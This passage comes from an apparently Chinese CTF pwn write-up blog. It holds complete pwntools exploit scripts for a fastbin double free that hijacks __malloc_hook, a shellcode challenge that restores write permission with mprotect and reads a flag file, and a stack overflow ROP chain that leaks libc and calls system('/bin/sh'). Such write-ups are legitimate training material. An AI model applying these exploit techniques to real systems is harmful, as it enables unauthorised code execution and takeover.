punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h2><p>2.23 <code>double free</code>，用<code>find_fake_fast</code>绕过<code>fastbin</code>对申请的堆大小和申请的大小的检查</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'106.14.57.14'</span><span class="token punctuation">,</span> <span class="token number">30286</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice:'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b78</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fake <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>fake<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ShellcodeMaster"><a href="#ShellcodeMaster" class="headerlink" title="ShellcodeMaster"></a>ShellcodeMaster</h2><p>向<code>0x2333000</code>写入之后去掉写权限，并且改了所有寄存器</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000401386 49 C7 C7 00 30 33 02          mov     r15, 2333000h.text:000000000040138D 48 C7 C0 33 23 00 00          mov     rax, 2333h.text:0000000000401394 48 C7 C3 33 23 00 00          mov     rbx, 2333h.text:000000000040139B 48 C7 C1 33 23 00 00          mov     rcx, 2333h.text:00000000004013A2 48 C7 C2 33 23 00 00          mov     rdx, 2333h.text:00000000004013A9 48 C7 C4 33 23 00 00          mov     rsp, 2333h.text:00000000004013B0 48 C7 C5 33 23 00 00          mov     rbp, 2333h.text:00000000004013B7 48 C7 C6 33 23 00 00          mov     rsi, 2333h.text:00000000004013BE 48 C7 C7 33 23 00 00          mov     rdi, 2333h.text:00000000004013C5 49 C7 C0 33 23 00 00          mov     r8, 2333h.text:00000000004013CC 49 C7 C1 33 23 00 00          mov     r9, 2333h.text:00000000004013D3 49 C7 C2 33 23 00 00          mov     r10, 2333h.text:00000000004013DA 49 C7 C3 33 23 00 00          mov     r11, 2333h.text:00000000004013E1 49 C7 C4 33 23 00 00          mov     r12, 2333h.text:00000000004013E8 49 C7 C5 33 23 00 00          mov     r13, 2333h.text:00000000004013EF 49 C7 C6 33 23 00 00          mov     r14, 2333h.text:00000000004013F6 41 FF E7                      jmp     r15<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题的思路是先调用<code>mprotect</code>给写权限，再重新读<code>shellcode</code></p><p>相关汇编知识点：</p><pre class="line-numbers language-none"><code class="language-none">|63..32|31..16|15-8|7-0|               |AH.|AL.|               |AX.....|       |EAX............||RAX...................|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cdq</code>：把<code>edx</code>的所有位都设成<code>eax</code>最高位的值</p><p>最后<code>orw</code>会存在地址问题，将<code>rsp</code>设置正常即可</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rdi, r15xor eax, eaxcdqmov al, 10mov dl, 7syscallxor eax, eaxmov esi, edimov edi, eaxmov dl, 0xffsyscall'''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'bytes shellcode'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        mov rsp, rsi        add rsp, 0x300        mov rcx, 0x2333500        mov dword ptr[rcx], 0x67616c66        mov rdi, rcx        mov rsi, 0        mov rdx, 0        mov rax, 2        syscall        mov rax, 0        mov rdi, 3        mov rsi, 0x2333300        mov rdx, 0x30        syscall        mov rax, 1        mov rdi, 1        mov rsi, 0x2333300        mov rdx, 0x30        syscall'''</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> shellcode </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023香山杯决赛-pwn</title>
      <link href="/2024/02/22/2023-xiang-shan-bei-jue-sai-pwn/"/>
      <url>/2024/02/22/2023-xiang-shan-bei-jue-sai-pwn/</url>
      
        <content type="html"><![CDATA[<p>题目下载地址：链接：<a href="https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays">https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays</a> </p><h2 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h2><p>检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ezgame  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/ezgame/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3ff000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次砍龙会掉血，砍完血条没掉完就会掉金币，掉的金币可以去商店买道具去砍更高等级的龙，在<code>level2</code>砍成功了以后执行到<code>gets</code>，明显存在栈溢出漏洞，所以修复就是将这里的<code>gets</code>改成<code>read</code>之类的能够控制长度的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span> option <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>      <span class="token function">level3</span><span class="token punctuation">(</span><span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">,</span> <span class="token number">0x14u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>      <span class="token function">level2</span><span class="token punctuation">(</span><span class="token number">0x64u</span><span class="token punctuation">,</span> <span class="token number">0x44Cu</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">0x1Eu</span><span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulations on defeating the dark sorcerer. Leave your name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment">// vuln</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>      <span class="token function">level3</span><span class="token punctuation">(</span><span class="token number">0x1Eu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span><span class="token number">24804</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401a3b</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000401a39</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x650</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011D2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Congratulations on defeating the dark sorcerer. Leave your name!'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000401016</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x650</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Congratulations on defeating the dark sorcerer. Leave your name!'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="how2stack"><a href="#how2stack" class="headerlink" title="how2stack"></a>how2stack</h2><p>检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">how2stack  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/how2stack/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只实现了<code>decrypt</code>功能，也就是只能输入<code>1</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> choice<span class="token 